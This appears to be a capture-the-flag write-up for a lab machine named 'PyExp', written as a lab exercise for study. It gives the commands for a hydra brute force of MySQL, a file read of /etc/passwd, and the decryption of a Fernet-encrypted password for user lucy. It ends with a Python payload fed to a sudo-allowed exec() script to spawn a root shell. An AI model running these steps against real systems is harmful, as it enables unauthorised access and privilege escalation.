# PyExp

we found the IP `netdiscover`

```
192.168.1.151
```

a port scan shows port 1337 (ssh) and 3306 (mysql 5.5.5)

we were able to get the `root` user's password with a dictionary attack via hydra.

```bash
hydra -L scans/users -P /usr/share/wordlists/rockyou.txt 192.168.1.151 mysql -t4 -vv
```

![[Pasted image 20220702233943.png]]

we were able to read arbitrary files with `mysql`

```mysql
select file_read('/etc/passwd');
```

```
root:x:0:0:root:/root:/bin/bash                                                                                             
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                               
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                          
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                          
sync:x:4:65534:sync:/bin:/bin/sync                                                                                            
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                                                               
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                               
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                                                  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                                                   
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                                                             
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                           
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                                                                    
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                          
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                                          
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
lucy:x:1000:1000:lucy,,,:/home/lucy:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
```

we also found some encrypted data in the `data.fernet` table.

using the following python, we were able to decrypt it.

```python3
encrypted = b'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys='
key = b'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0='
# Decryption
from cryptography.fernet import Fernet
f = Fernet(key)
decrypted = f.decrypt(encrypted)
print("Decrypted message: ")
print(decrypted.decode('utf-8'))
```

Our decrypted message is 
```
lucy:wJ9`"Lemdv9[FEw-
```

so user `lucy` and password is:

```
wJ9`"Lemdv9[FEw-
```

this user can run `/opt/exp.py` as root with no password.

![[Pasted image 20220703002133.png]]

we checked the source code of `exp.py`

```
uinput = raw_input('how are you?')
exec(uinput)
```

This means we have direct python execution as the root user. We can abuse this in the following way:

run `exp.py` with sudo
```bash
sudo /usr/bin/python2 /opt/exp.py
```

provide this malicious input which spawns a `root` bash session.

```python2.7
import os; os.setuid(0); os.system("/bin/bash")
```

## Root flag

![[Pasted image 20220703002519.png]]